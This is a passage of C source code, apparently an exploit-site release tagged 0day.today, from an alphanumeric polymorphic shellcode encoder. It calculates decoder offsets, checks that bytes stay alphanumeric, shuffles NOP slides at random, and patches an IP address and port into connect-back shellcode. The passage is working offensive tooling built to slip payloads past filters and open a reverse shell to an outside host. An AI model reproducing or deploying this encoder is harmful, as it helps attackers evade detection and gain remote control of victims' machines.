+    size_nop_slide1 -=shrink;             /////////////////////////                                                                |   |
+    printf("shrinking decoder by: %d\n", shrink);                //                                                                |   |
+                                                                 //                                                                |   |
+    offset_imul_instruction            = decoder_length_section1+//                                                                |   |
+                                         decoder_length_section2+//                                                                |   |
+                                         size_nop_slide1;//////////                                                                |   |
+                                                         //                                                                        |   |
+    backward_slide_offset = rand() % 15;                 //    (selects a number from 0 to 14 in increments of 1)                  |   |
+    strncpy(decoder,                                     //                                                                        |   |
+            slide_substr_back(decoder,                   //                                                                        |   |
+                              offset_imul_instruction,   //                                                                        |   |
+                              imul_instruction_length,   //                                                                        |   |
+                              size_decoder,           /////                                                                        |   |
+                              backward_slide_offset), //                                                                           |   |
+            size_decoder);                            //                                                                           |   |
+    offset_imul_instruction -=backward_slide_offset;  //                                                                           |   |
+    size_nop_slide1         -=backward_slide_offset;  //                                                                           |   |
+    size_nop_slide2         +=backward_slide_offset;  //////////////                                                               |   |
+    printf("backward_slide_offset = %d\n", backward_slide_offset);//                                                               |   |
+                                                                  ///////////////////////////////////                              |   |
+    negative_offset_size_decoder1      = 9;                                                        //                              |   |
+    negative_offset_size_decoder2      = 12;                                                       //                              |   |
+    negative_offset_size_decoder3      = 15;                                                       //                              |   |
+                                                                                                   //                              |   |
+    offset_half_size_decoder           = 6;                                                        //                              |   |
+    offset_terminating_key             = 8;                                                        //                              |   |
+    offset_jne_xor1                    = 21;                                                       //                              |   |
+    offset_size_decoder_min_1          = 24;                                                       //                              |   |
+                                                                                                   //                              |   |
+    offset_imul_key_offset1            = 14 + decoder_length_section1;                             //                              |   |
+    offset_imul_key_offset2            = 17 + decoder_length_section1;                             //                              |   |
+    offset_size_decoder_pls_2          = 21 + decoder_length_section1;                             //                              |   |
+    offset_imul_key_offset3            = 24 + decoder_length_section1;                             //                              |   |
+                                                                                                   //                              |   |
+    offset_nop_slide1                   = decoder_length_section1+                                 //                              |   |
+                                         decoder_length_section2;                                  //                              |   |
+    offset_nop_slide2                   = decoder_length_section1+                                 //                              |   |
+                                         decoder_length_section2+                                  //                              |   |
+                                         size_nop_slide1+                                          //                              |   |
+                                         imul_instruction_length;                                  //                              |   |
+                                                                                                   //                              |   |
+    offset_imul_instruction1           = offset_imul_instruction;                                  //                              |   |
+    offset_imul_instruction2           = offset_imul_instruction+1;                                //                              |   |
+    offset_imul_instruction3           = offset_imul_instruction+2;                                //                              |   |
+    offset_imul_instruction4           = offset_imul_instruction+3;                                //                              |   |
+                                                                                                   //                              |   |
+                                                                                                   //                              |   |
+    offset_imul_key                    = offset_imul_instruction4;                                 //                              |   |
+                                                                                                   //                              |   |
+    offset_jne_xor2                    = size_decoder-1;                                           //                              |   |
+    jne_xor_negative_offset            = decoder_length_section3+                                  //                              |   |
+                                         decoder_length_section2+                                  //                              |   |
+                                         size_nop_slide2+                                          //                              |   |
+                                         imul_instruction_length+                                  //                              |   |
+                                         size_nop_slide1;                                          //                              |   |
+                                                                                                   //                              |   |
+                                                                                                   //                              |   |
+    printf("size_decoder=0x%2X - %s\n",                                                            //                              |   |
+        (UCHAR)size_decoder,                                                                       //////                          |   |
+        is_alnum((UCHAR)size_decoder+(decoder_version_1?0:2))?"valid":"invalid - not alphanumeric!!!");//                          |   |
+    *(decoder+offset_imul_instruction3)                 = size_decoder+(decoder_version_1?0:2);    //////                          |   |
+                                                                                                   //                              |   |
+    printf("half_size_decoder=0x%2X - %s\n",                                                       //                              |   |
+        (UCHAR)half_size_decoder,                                                                  //                              |   |
+        is_alnum((UCHAR)half_size_decoder)?"valid":"invalid - not alphanumeric!!!");               //                              |   |
+    *(decoder+offset_half_size_decoder)                   = half_size_decoder;                     //                              |   |
+                                                                                                   //                              |   |
+    printf("offset_imul_key=0x%2X - %s\n",                                                         //                              |   |
+        (UCHAR)offset_imul_key,                                                                    //                              |   |
+        is_alnum((UCHAR)offset_imul_key)?"valid":"invalid - not alphanumeric!!!");                 //                              |   |
+    *(decoder+offset_imul_key_offset1)                    = offset_imul_key;                       //                              |   |
+    *(decoder+offset_imul_key_offset2)                    = offset_imul_key;                       //                              |   |
+    *(decoder+offset_imul_key_offset3)                    = offset_imul_key;                       //                              |   |
+    //                                                                                             //                              |   |
+    printf("size_decoder-1=0x%2X - %s\n",                                                          //                              |   |
+        (UCHAR)size_decoder-1,                                                                     //                              |   |
+        is_alnum((UCHAR)(size_decoder-1))?"valid":"invalid - not alphanumeric!!!");                //                              |   |
+    *(decoder+offset_size_decoder_min_1)                  = size_decoder-1;                        //                              |   |
+                                                                                                   //                              |   |
+    printf("size_decoder+2=0x%2X - %s\n",                                                          //                              |   |
+        (UCHAR)size_decoder+2,                                                                     ////////                        |   |
+        is_alnum((UCHAR)(size_decoder+(decoder_version_1?2:0)))?"valid":"invalid - not alphanumeric!!!");//                        |   |
+    *(decoder+offset_size_decoder_pls_2)                = size_decoder+(decoder_version_1?2:0);    ////////                        |   |
+                                                                                                   //                              |   |
+    *(decoder+size_decoder-negative_offset_size_decoder1) = size_decoder;                          //                              |   |
+    *(decoder+size_decoder-negative_offset_size_decoder2) = size_decoder;                          //                              |   |
+    *(decoder+size_decoder-negative_offset_size_decoder3) = size_decoder;                          //////////////////////////////  |   |
+                                                                                                                               //  |   |
+    *(decoder+offset_jne_xor1)                     = get_two_xor_complemets_for_byte_and_xor((UCHAR)(-jne_xor_negative_offset),//  |   |
+                                                                                             '\xFF',                           //  |   |
+                                                                                             0);                               //  |   |
+    *(decoder+offset_jne_xor2)                     = get_two_xor_complemets_for_byte_and_xor((UCHAR)(-jne_xor_negative_offset),//  |   |
+                                                                                             '\xFF',                           //  |   |
+                                                                                             1);                               //  |   |
+#ifdef CONNECT_BACK_SHELLCODE                                                                                                  //  |   |
+    ip_address                                     = ip_str_to_dw(IP_ADDRESS);///////////////////////////////////////////////////  |   |
+    if (ip_address == -1)    ///////////////////////////////////////////////////                                                   |   |
+        exit(-1);            //                                                                                                    |   |
+                             ///////////////////////////////////                                                                   |   |
+    //set shellcode with ip address and port for connect-back //                                                                   |   |
+    ///*                                                      //////////                                                           |   |
+    *((DWORD *)(p_shellcode+OFFSET_IP_ADDRESS))           = ip_address;/////////////////                                           |   |
+    *((DWORD *)(p_shellcode+OFFSET_TCP_PORT_NUMBER))      = my_htonl(TCP_PORT_NUMBER);//                                           |   |
+    *(p_shellcode+OFFSET_TCP_PORT_NUMBER)                 = (UCHAR)2;                 //                                           |   |
+#endif                                        //////////////////////////////////////////                                           |   |
+    //*/                                      //                                                                                   |   |
+    //set decoder with 'random' nop slides    //                                                                                   |   |
+    strncpy(decoder+offset_nop_slide1,        ////////////////////////////                                                         |   |
+            shuffle(get_nop_slide(size_nop_slide1, 1), size_nop_slide1),//                                                         |   |
+            size_nop_slide1);                                           //                                                         |   |
+    strncpy(decoder+offset_nop_slide2,                                  //                                                         |   |
+            shuffle(get_nop_slide(size_nop_slide2, 2), size_nop_slide2),//                                                         |   |
+            size_nop_slide2);              ///////////////////////////////                                                         |   |
+                                           //                                                           
+
+#  0day.today [2023-03-23]  #
